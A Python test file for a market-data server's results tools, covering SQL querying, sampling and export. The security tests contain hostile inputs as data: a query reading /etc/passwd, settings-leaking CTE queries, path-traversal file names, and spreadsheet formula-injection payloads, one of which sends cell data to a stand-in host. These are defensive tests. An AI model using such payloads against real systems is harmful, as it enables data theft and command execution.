"""The results tools (contract 5.5): results_query, results_describe,
results_sample, results_list, results_drop and results_export."""

from __future__ import annotations

import asyncio
import inspect
import json
import os
import pathlib
import re
import time

import pyarrow as pa
import pyarrow.csv as pacsv
import pyarrow.parquet as pq
import pytest
from coresupport import bar_rows, bar_table, news_rows, provenance, run

from marketlens_mcp.plugin_api import ToolError
from marketlens_mcp.results import tools as rt
from marketlens_mcp.results.arrow import rows_to_table
from marketlens_mcp.results.store import StoreLimits, StoreRoot
from marketlens_mcp.results_api import ColumnInfo, InlineResult, ResultInfo, ResultMarker
from marketlens_mcp.testing import call_tool, make_context
from marketlens_schema.market import Bar, NewsItem

SPECS = {s.name: s for s in rt.SPECS}


@pytest.fixture
def setup(tmp_path):
    root = StoreRoot(tmp_path / "cache", StoreLimits(export_dir=str(tmp_path / "out")))
    (tmp_path / "out").mkdir()
    store = root.session("s")
    bars = store.put(
        bar_table(n=400),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    small = store.put(
        rows_to_table(bar_rows(n=5), Bar),
        tool="market_bars",
        model=Bar.schema_name,
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
    )
    news = store.put(
        rows_to_table(news_rows(), NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    ctx = make_context(store=store, settings={"export_dir": str(tmp_path / "out")})
    return ctx, store, bars, small, news, tmp_path


def call(ctx, name, **kw):
    return run(call_tool(SPECS[name], ctx, **kw))


def test_six_specs_with_their_capabilities():
    assert {n: s.capability for n, s in SPECS.items()} == {
        "results_query": "results",
        "results_describe": "results",
        "results_sample": "results",
        "results_list": "results",
        "results_drop": "results",
        "results_export": "results.export",
    }
    for s in SPECS.values():
        assert s.provider == "local"
        assert s.golden_test == "tests/core/test_results_tools.py"


def test_query_inline(setup):
    ctx, _, bars, *_ = setup
    out = call(
        ctx,
        "results_query",
        sql=f"SELECT ticker, count(*) AS n FROM {bars.result_id} GROUP BY ticker ORDER BY ticker",
    )
    assert isinstance(out, InlineResult)
    assert out.model == "marketlens.QueryRow"
    assert out.rows == [
        {"ticker": "AAPL", "n": 400},
        {"ticker": "MSFT", "n": 400},
        {"ticker": "NVDA", "n": 400},
    ]
    assert [c.type for c in out.columns] == ["VARCHAR", "BIGINT"]
    assert out.provenance.provider == "marketlens"
    assert out.provenance.route == "duckdb:results_query"
    assert out.provenance.derived_from == [bars.result_id]
    assert any(n.startswith("Executed: SELECT") and "LIMIT 51" in n for n in out.notes)
    assert "Truncated: no" in out.notes


def test_query_default_limit_and_truncation_note(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT ticker, t FROM {bars.result_id}")
    assert out.row_count == 50
    assert any(n.startswith("Truncated: yes") for n in out.notes)


def test_query_max_rows_bounds(setup):
    """max_rows above results.query_max_rows was refused although the
    description said a larger LIMIT is lowered: it is lowered too, with a note."""
    ctx, _, bars, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT 1", max_rows=0)
    assert info.value.code == "invalid_arguments"
    out = call(ctx, "results_query", sql=f"SELECT ticker FROM {bars.result_id}", max_rows=500)
    assert isinstance(out, InlineResult) and out.row_count == 200
    assert any(
        "max_rows 500 is above results.query_max_rows (200), so it was lowered" in n for n in out.notes
    )
    assert any(n.startswith("Truncated: yes; more than 200 rows") for n in out.notes)


def test_query_byte_cap_offloads_its_own_result(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
    assert isinstance(out, ResultMarker)
    assert out.model == "marketlens.QueryRow"
    assert out.parents == [bars.result_id]
    assert out.row_count == 200
    assert out.provenance.derived_from == [bars.result_id]


def test_query_store_true_keeps_up_to_fetch_max_rows_and_handles_compose(setup):
    ctx, store, bars, small, *_ = setup
    out = call(
        ctx,
        "results_query",
        sql=f"SELECT ticker, t, close FROM {bars.result_id} WHERE ticker = 'AAPL'",
        store=True,
    )
    assert isinstance(out, ResultMarker) and out.row_count == 400
    second = call(
        ctx,
        "results_query",
        sql=f"SELECT count(*) AS n FROM {out.result_id} a JOIN {small.result_id} b USING (ticker, t)",
    )
    assert second.rows == [{"n": 5}]
    assert set(second.provenance.derived_from) == {out.result_id, small.result_id}


def test_query_store_true_keeps_the_parents_time_series_columns_and_units(setup):
    ctx, store, bars, small, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id} WHERE ticker = 'AAPL'", store=True)
    info = store.info(out.result_id)
    assert (info.model, info.time_column, info.group_column) == ("marketlens.QueryRow", "t", "ticker")
    units = {c.name: c.unit for c in info.columns}
    assert units["close"] == {c.name: c.unit for c in bars.columns}["close"] == "price"
    # Only what is still there unchanged: the series column renamed, the time column cast or two parents.
    renamed = store.info(
        call(
            ctx, "results_query", sql=f"SELECT ticker AS sym, t, close FROM {bars.result_id}", store=True
        ).result_id
    )
    assert (renamed.time_column, renamed.group_column) == ("t", None)
    for sql in (
        f"SELECT ticker, CAST(t AS VARCHAR) AS t, close FROM {bars.result_id}",
        f"SELECT ticker, t AS ts, close FROM {bars.result_id}",
        f"SELECT a.ticker, a.t, a.close FROM {bars.result_id} a JOIN {small.result_id} b USING (ticker, t)",
    ):
        kept = store.info(call(ctx, "results_query", sql=sql, store=True).result_id)
        assert (kept.time_column, kept.group_column) == (None, None), sql
        assert all(c.unit is None for c in kept.columns), sql


def test_a_stored_answer_records_the_model_its_columns_came_from(setup):
    """A column a stored answer keeps with its unit records the model of the
    result that computed it (source_model), through a query of a query, so it
    is known after that result is gone (analytics_volatility tells a drawdown
    from returns by it); other columns' JSON has no source_model."""
    ctx, store, bars, *_ = setup
    first = call(ctx, "results_query", sql=f"SELECT ticker, t, close FROM {bars.result_id}", store=True)
    second = call(ctx, "results_query", sql=f"SELECT * FROM {first.result_id}", store=True)
    store.drop(first.result_id)
    third = call(ctx, "results_query", sql=f"SELECT * FROM {second.result_id}", store=True)
    assert {c.name: c.source_model for c in store.info(third.result_id).columns} == {
        "ticker": None,
        "t": "marketlens.Bar",
        "close": "marketlens.Bar",
    }
    shown = {c["name"]: c for c in third.model_dump(mode="json")["columns"]}
    assert shown["close"]["source_model"] == "marketlens.Bar" and "source_model" not in shown["ticker"]
    # An answer that recorded none (stored before source_model was): a query of
    # it records none either, not that answer's own model, marketlens.QueryRow.
    unrecorded = store.put(
        store.read(second.result_id, limit=1000),
        tool="results_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
        time_column="t",
        group_column="ticker",
        column_units={"t": "UTC", "close": "price"},
        parents=[second.result_id],
    )
    fourth = call(ctx, "results_query", sql=f"SELECT * FROM {unrecorded.result_id}", store=True)
    assert {c.name: (c.unit, c.source_model) for c in store.info(fourth.result_id).columns} == {
        "ticker": (None, None),
        "t": ("UTC", None),
        "close": ("price", None),
    }


def test_a_columns_json_schema_describes_its_fields_where_source_model_is_left_out():
    """source_model is left out of a column's JSON when None, and the JSON
    Schema of a column, alone or in a result, still lists every field in
    serialization mode as in validation mode (not an opaque object)."""
    assert "source_model" not in ColumnInfo(name="x", type="DOUBLE").model_dump(mode="json")
    kept = ColumnInfo(name="x", type="DOUBLE", source_model="marketlens.Bar").model_dump(mode="json")
    assert kept["source_model"] == "marketlens.Bar"
    for model in (ColumnInfo, ResultInfo, ResultMarker, InlineResult):
        for mode in ("validation", "serialization"):
            schema = model.model_json_schema(mode=mode)
            column = schema if model is ColumnInfo else schema["$defs"]["ColumnInfo"]
            assert set(column.get("properties", {})) == set(ColumnInfo.model_fields), (model.__name__, mode)


def test_query_over_news_is_external_text(setup):
    ctx, _, _, _, news, _ = setup
    from marketlens_mcp import pipeline

    done = run(
        pipeline.execute(SPECS["results_query"], ctx, {"sql": f"SELECT headline FROM {news.result_id}"})
    )
    assert isinstance(done.response, InlineResult)
    assert done.risk == "external_text"
    bars_id = setup[2].result_id
    done = run(pipeline.execute(SPECS["results_query"], ctx, {"sql": f"SELECT count(*) FROM {bars_id}"}))
    assert done.risk == "api_structured"
    done = run(pipeline.execute(SPECS["results_sample"], ctx, {"result_id": news.result_id}))
    assert done.risk == "external_text"
    done = run(pipeline.execute(SPECS["results_describe"], ctx, {"result_id": news.result_id}))
    assert done.risk == "external_text"


def test_query_refusals_become_tool_errors(setup):
    ctx, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="DROP TABLE x")
    assert info.value.code == "sql_not_select"
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT * FROM read_csv('/etc/passwd')")
    assert info.value.code == "sql_function"


LEAKY = (
    "('secret_directory', 'allowed_directories', 'temp_directory', 'home_directory', 'extension_directory')"
)


@pytest.mark.parametrize(
    "sql",
    [
        f"SELECT name, setting FROM (WITH pg_settings AS (SELECT 1) SELECT 1) q, pg_settings WHERE name IN {LEAKY}",
        f"SELECT name, setting FROM pg_settings WHERE name IN {LEAKY} AND EXISTS (WITH pg_settings AS (SELECT 1) SELECT 1)",
        f"WITH pg_settings AS (SELECT * FROM pg_settings) SELECT name, setting FROM pg_settings WHERE name IN {LEAKY}",
        f"WITH RECURSIVE pg_settings AS (SELECT name, setting FROM pg_settings WHERE name IN {LEAKY} "
        "UNION SELECT 'cte', 'cte') SELECT * FROM pg_settings",
        f"WITH RECURSIVE pg_settings AS (SELECT 'secret_directory' AS name INTERSECT SELECT name FROM pg_settings "
        f"WHERE name IN {LEAKY}) SELECT * FROM pg_settings",
        "WITH c AS (SELECT 1 AS k) SELECT name, setting FROM pg_settings, c AS pg_settings "
        f"WHERE name IN {LEAKY} AND EXISTS (WITH pg_settings AS (SELECT 1) SELECT 1)",
        "SELECT * FROM (WITH duckdb_databases AS (SELECT 1) SELECT 1) q, duckdb_databases",
        "SELECT * FROM (WITH pragma_database_list AS (SELECT 1) SELECT 1) q, pragma_database_list",
        "SELECT * FROM (WITH sqlite_master AS (SELECT 1) SELECT 1) q, sqlite_master",
        f"SELECT name, setting FROM pg_settings WHERE name IN {LEAKY}",
        "SELECT * FROM duckdb_databases",
        "SELECT ticker, count(*) AS n FROM {bars} GROUP BY ticker",
        "WITH x AS (SELECT * FROM {bars}) SELECT * FROM x ORDER BY t LIMIT 3",
    ],
    ids=lambda s: s[:50],
)
def test_no_query_output_carries_an_absolute_path(setup, sql):
    """Whatever results_query sends back (rows, columns, notes or the refusal)
    never names a filesystem path: the cache, the home folder or the cwd."""
    ctx, _, bars, _, _, tmp_path = setup
    roots = [str(tmp_path), str(pathlib.Path.home()), os.getcwd(), str(tmp_path.resolve())]
    pattern = re.compile(r"(?<![\w.\-~:])/(?:Users|home|private|var|tmp|etc|opt|Volumes|root)/")
    try:
        out = call(ctx, "results_query", sql=sql.replace("{bars}", bars.result_id), max_rows=200)
    except ToolError as exc:
        text = f"{exc.code} {exc.message} {exc.hint}"
    else:
        text = out.model_dump_json()
    leaked = [r for r in roots if r and r in text] + pattern.findall(text)
    assert leaked == [], text[:500]


def test_describe_returns_the_marker_without_a_new_result(setup):
    ctx, store, bars, *_ = setup
    before = len(store.list())
    out = call(ctx, "results_describe", result_id=bars.result_id)
    assert isinstance(out, ResultMarker) and out.result_id == bars.result_id
    assert len(store.list()) == before


def test_describe_unknown_is_r15(setup):
    ctx, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_describe", result_id="r_0000000000")
    assert info.value.code == "result_unknown"


@pytest.mark.parametrize("method", ["first", "last", "random"])
def test_sample(setup, method):
    ctx, _, bars, *_ = setup
    out = call(
        ctx, "results_sample", result_id=bars.result_id, n=5, method=method, columns=["ticker", "t", "close"]
    )
    assert isinstance(out, InlineResult)
    assert out.row_count == 5
    assert set(out.rows[0]) == {"ticker", "t", "close"}
    assert out.provenance.route == "duckdb:results_sample"
    if method == "first":
        assert out.rows[0]["t"] == "2026-01-05T14:30:00Z"


def test_sample_random_is_repeatable(setup):
    ctx, _, bars, *_ = setup
    a = call(ctx, "results_sample", result_id=bars.result_id, n=5, method="random")
    b = call(ctx, "results_sample", result_id=bars.result_id, n=5, method="random")
    assert a.rows == b.rows


def test_sample_unknown_column_names_the_available_ones(setup):
    ctx, _, bars, *_ = setup
    with pytest.raises(ToolError) as info:
        call(ctx, "results_sample", result_id=bars.result_id, columns=["nope"])
    assert info.value.code == "unknown_column"
    assert "close" in info.value.message


def test_sample_shrinks_to_the_byte_cap(tmp_path):
    root = StoreRoot(tmp_path / "cache", StoreLimits(query_max_bytes=1000))
    store = root.session("s")
    news = store.put(
        rows_to_table([r.model_copy(update={"headline": "x" * 400}) for r in news_rows(10)], NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    out = call(make_context(store=store), "results_sample", result_id=news.result_id, n=10)
    assert out.row_count < 10
    assert any("fewer rows" in n for n in out.notes)
    assert len(json.dumps(out.rows)) <= 1000


def test_list_is_newest_first(setup):
    ctx, store, bars, small, news, _ = setup
    out = call(ctx, "results_list")
    assert isinstance(out, InlineResult)
    assert [r["result_id"] for r in out.rows] == [i.result_id for i in store.list()]
    assert set(out.rows[0]) == {"result_id", "tool", "model", "row_count", "created_at", "expires_at", "risk"}


def test_drop(setup):
    ctx, store, bars, *_ = setup
    out = call(ctx, "results_drop", result_id=bars.result_id)
    assert out.rows == [{"result_id": bars.result_id, "dropped": True}]
    again = call(ctx, "results_drop", result_id=bars.result_id)
    assert again.rows == [{"result_id": bars.result_id, "dropped": False}]


@pytest.mark.parametrize("fmt", ["csv", "parquet"])
def test_export_writes_only_under_the_export_dir(setup, fmt):
    ctx, _, _, small, _, tmp_path = setup
    out = call(ctx, "results_export", result_id=small.result_id, format=fmt, file_name="bars")
    row = out.rows[0]
    assert row == {
        "result_id": small.result_id,
        "file_name": f"bars.{fmt}",
        "format": fmt,
        "rows": 15,
        "bytes": (tmp_path / "out" / f"bars.{fmt}").stat().st_size,
    }
    target = tmp_path / "out" / f"bars.{fmt}"
    table = pacsv.read_csv(target) if fmt == "csv" else pq.read_table(target)
    assert table.num_rows == 15
    assert str(tmp_path) not in json.dumps(out.model_dump(mode="json"))


def test_export_refuses_overwrite_and_bad_names(setup):
    ctx, _, _, small, _, _ = setup
    call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x")
    with pytest.raises(ToolError) as info:
        call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x")
    assert info.value.code == "export_exists"
    call(ctx, "results_export", result_id=small.result_id, format="csv", file_name="x", overwrite=True)
    for bad in ("../x", "a/b", "", ".", "..", "x" * 65):
        with pytest.raises(ToolError) as info:
            call(ctx, "results_export", result_id=small.result_id, format="csv", file_name=bad)
        assert info.value.code == "invalid_arguments"


def test_export_without_a_folder(store):
    info = store.put(
        rows_to_table(bar_rows(n=2), Bar), tool="t", model=Bar.schema_name, provenance=provenance()
    )
    with pytest.raises(ToolError) as e:
        call(make_context(store=store), "results_export", result_id=info.result_id, format="csv")
    assert e.value.code == "export_dir_missing"


def test_query_answers_whole_number_sums_as_numbers(setup):
    """sum() over integers is a HUGEINT, which came back as the string '1008'
    next to count(*)'s 1008; exact decimals stay strings."""
    ctx, _, bars, *_ = setup
    sql = (
        f"SELECT sum(CASE WHEN close > 0 THEN 1 ELSE 0 END) AS s, count(*) AS c, "
        f"CAST(1.25 AS DECIMAL(10, 2)) AS d, CAST(9223372036854775808 AS HUGEINT) AS huge "
        f"FROM {bars.result_id}"
    )
    out = call(ctx, "results_query", sql=sql)
    # Beyond BIGINT a whole number stays an exact string.
    assert out.rows == [{"s": 1200, "c": 1200, "d": "1.25", "huge": "9223372036854775808"}]
    assert [c.type for c in out.columns] == ["BIGINT", "BIGINT", "DECIMAL(10,2)", "DECIMAL(38,0)"]
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert [c.type for c in stored.columns][:2] == ["BIGINT", "BIGINT"]


def test_query_of_a_dropped_result_says_it_was_dropped(setup):
    """results_query of a dropped result gave sql_table (not one of this
    session's results) where results_describe gave result_dropped."""
    ctx, _, bars, small, *_ = setup
    call(ctx, "results_drop", result_id=small.result_id)
    for name in ("results_query", "results_describe"):
        arguments = {"sql": f"SELECT count(*) FROM {small.result_id}"} if name == "results_query" else {}
        with pytest.raises(ToolError) as info:
            call(ctx, name, **(arguments or {"result_id": small.result_id}))
        assert info.value.code == "result_dropped", name
        assert small.result_id in info.value.message
    with pytest.raises(ToolError) as info:
        call(ctx, "results_query", sql="SELECT * FROM r_00000000ff")
    assert info.value.code == "sql_table" and bars.result_id in info.value.message


def test_query_refuses_pivot_with_the_way_round_it(setup):
    ctx, _, bars, *_ = setup
    for sql in (
        f"PIVOT {bars.result_id} ON ticker USING last(close) GROUP BY t",
        f"SELECT * FROM (PIVOT {bars.result_id} ON ticker USING last(close) GROUP BY t) LIMIT 2",
    ):
        with pytest.raises(ToolError) as info:
            call(ctx, "results_query", sql=sql)
        assert info.value.code == "sql_forbidden"
        assert (
            "PIVOT and UNPIVOT are not allowed" in info.value.message
            and "FILTER (WHERE" in info.value.message
        )


def test_query_stored_for_size_says_which_limit_and_the_description_names_the_limits(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_query", sql=f"SELECT * FROM {bars.result_id}", max_rows=200)
    assert isinstance(out, ResultMarker)
    assert any("bytes as JSON) is larger than results.query_max_bytes (24,000 bytes)" in n for n in out.notes)
    text = SPECS["results_query"].description
    for words in (
        "PIVOT and UNPIVOT are not",
        "at most 8 results",
        "24,000 bytes",
        "decimals come back as strings",
    ):
        assert words in text


def test_query_keeps_every_column_of_a_join_that_repeats_a_name(setup):
    """a.close, b.close came back as one close holding b's value inline, and
    with store=true failed as internal_error: a repeated name is renamed the
    way DuckDB names it (close_1), with a note."""
    ctx, _, _, small, *_ = setup
    rid = small.result_id
    sql = (
        f"SELECT a.t, a.close, b.close FROM {rid} a JOIN {rid} b ON a.t = b.t "
        f"WHERE a.ticker = 'AAPL' AND b.ticker = 'MSFT' ORDER BY a.t LIMIT 2"
    )
    out = call(ctx, "results_query", sql=sql)
    assert isinstance(out, InlineResult)
    assert [c.name for c in out.columns] == ["t", "close", "close_1"]
    assert [(r["close"], r["close_1"]) for r in out.rows] == [
        (pytest.approx(100.1), pytest.approx(110.1)),
        (pytest.approx(100.11), pytest.approx(110.11)),
    ]
    assert any(
        n.startswith("Repeated column names were renamed") and "close -> close_1" in n for n in out.notes
    )
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert isinstance(stored, ResultMarker)
    assert [c.name for c in stored.columns] == ["t", "close", "close_1"]
    star = call(
        ctx, "results_query", sql=f"SELECT * FROM {rid} a JOIN {rid} b ON a.t = b.t AND a.ticker = b.ticker"
    )
    names = [c.name for c in star.columns]
    assert len(names) == 26 and len(set(names)) == 26
    assert all(set(names) - set(row) <= {"absent"} for row in star.rows)


def test_sample_of_a_repeated_column_shows_it_once(setup):
    ctx, _, bars, *_ = setup
    out = call(ctx, "results_sample", result_id=bars.result_id, n=2, columns=["close", "close"])
    assert [c.name for c in out.columns] == ["close"]
    assert all(set(row) == {"close"} for row in out.rows)


def test_query_answers_intervals_and_nanosecond_timestamps(setup):
    """An INTERVAL answered as [months, days, nanoseconds] inline and failed
    as internal_error when stored (Parquet has no Arrow month_day_nano type);
    a TIMESTAMP_NS with sub-microsecond digits failed even inline."""
    ctx, _, _, small, *_ = setup
    sql = f"SELECT t, t - lag(t) OVER (ORDER BY t) AS gap FROM {small.result_id} WHERE ticker = 'AAPL' ORDER BY t"
    out = call(ctx, "results_query", sql=sql)
    assert [r["gap"] for r in out.rows] == [None, "00:01:00", "00:01:00", "00:01:00", "00:01:00"]
    assert [c.type for c in out.columns] == ["TIMESTAMP WITH TIME ZONE", "VARCHAR"]
    assert any(n.startswith("Interval column(s) gap are text") for n in out.notes)
    stored = call(ctx, "results_query", sql=sql, store=True)
    assert isinstance(stored, ResultMarker)
    back = call(
        ctx, "results_query", sql=f"SELECT max(epoch(CAST(gap AS INTERVAL))) AS s FROM {stored.result_id}"
    )
    assert back.rows == [{"s": 60.0}]
    ns_sql = "SELECT TIMESTAMP_NS '2026-01-01 00:00:00.123456789' AS ns"
    ns = call(ctx, "results_query", sql=ns_sql)
    assert ns.rows == [{"ns": "2026-01-01T00:00:00.123456"}]
    assert any("ns are cut to microseconds" in n for n in ns.notes)
    assert isinstance(call(ctx, "results_query", sql=ns_sql, store=True), ResultMarker)


def test_csv_export_neutralises_third_party_formulas(setup):
    """A headline starting with = (or +, -, @) was written as is, so a
    spreadsheet opening the export ran it as a formula; third-party text now
    gets a leading ', with a note. Other results and Parquet are unchanged."""
    ctx, store, _, _, _, tmp_path = setup
    headlines = [
        '=HYPERLINK("https://evil.example/?d="&A2,"Fed statement")',
        "+cmd|' /C calc'!A0",
        "Plain",
        None,
    ]
    rows = [
        r.model_copy(update={"headline": h or "x", "summary": h})
        for r, h in zip(news_rows(4), headlines, strict=True)
    ]
    news = store.put(
        rows_to_table(rows, NewsItem),
        tool="news_search",
        model=NewsItem.schema_name,
        provenance=provenance(),
        risk="external_text",
    )
    out = call(ctx, "results_export", result_id=news.result_id, format="csv", file_name="news")
    written = pacsv.read_csv(tmp_path / "out" / "news.csv").to_pydict()
    assert written["headline"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
    assert written["summary"][:3] == ["'" + headlines[0], "'" + headlines[1], "Plain"]
    assert any(n.startswith("4 third-party text cell(s) began with =, +, -, @") for n in out.notes)
    call(ctx, "results_export", result_id=news.result_id, format="parquet", file_name="news")
    assert (
        pq.read_table(tmp_path / "out" / "news.parquet").column("headline").to_pylist()[:2] == headlines[:2]
    )
    plain = store.put(
        pa.table({"s": ["-1.5", "=x"]}),
        tool="results_query",
        model="marketlens.QueryRow",
        provenance=provenance(),
    )
    out = call(ctx, "results_export", result_id=plain.result_id, format="csv", file_name="plain")
    assert pacsv.read_csv(
        tmp_path / "out" / "plain.csv", convert_options=pacsv.ConvertOptions(column_types={"s": pa.string()})
    ).column("s").to_pylist() == ["-1.5", "=x"]
    assert out.notes == []


def test_a_long_query_leaves_the_event_loop_and_the_light_tools_free(tmp_path):
    """results_query ran DuckDB on the event loop: a query running to its
    timeout froze every other call (and the session's messages) until it
    stopped. It runs in the query thread now; results_list answers meanwhile."""
    store = StoreRoot(tmp_path / "cache", StoreLimits(query_timeout_seconds=2)).session("s")
    ctx = make_context(store=store)
    heavy = (
        "SELECT count(*) AS n FROM (SELECT unnest(range(5000)) AS a) t1, (SELECT unnest(range(5000)) AS b) t2, "
        "(SELECT unnest(range(5000)) AS c) t3"
    )

    async def go():
        gaps = []

        async def ticker():
            last = time.monotonic()
            while True:
                await asyncio.sleep(0.05)
                now = time.monotonic()
                gaps.append(now - last)
                last = now

        tick = asyncio.create_task(ticker())
        query = asyncio.create_task(call_tool(SPECS["results_query"], ctx, sql=heavy))
        await asyncio.sleep(0.3)
        started = time.monotonic()
        listed = await call_tool(SPECS["results_list"], ctx)
        listed_after = time.monotonic() - started
        with pytest.raises(ToolError) as info:
            await query
        tick.cancel()
        return max(gaps), listed, listed_after, info.value.code

    worst_gap, listed, listed_after, code = asyncio.run(go())
    assert code == "sql_timeout"
    assert isinstance(listed, InlineResult) and listed_after < 1.0
    assert worst_gap < 1.0


def test_every_store_bound_handler_runs_off_the_event_loop():
    """The results and analytics handlers are synchronous store work wrapped
    to run in a thread, so none of them can hold the event loop."""
    from marketlens_mcp.analytics.tools import all_specs

    for spec in (*rt.SPECS, *all_specs()):
        inner = getattr(spec.handler, "__wrapped__", None)
        assert inner is not None and not inspect.iscoroutinefunction(inner), spec.name
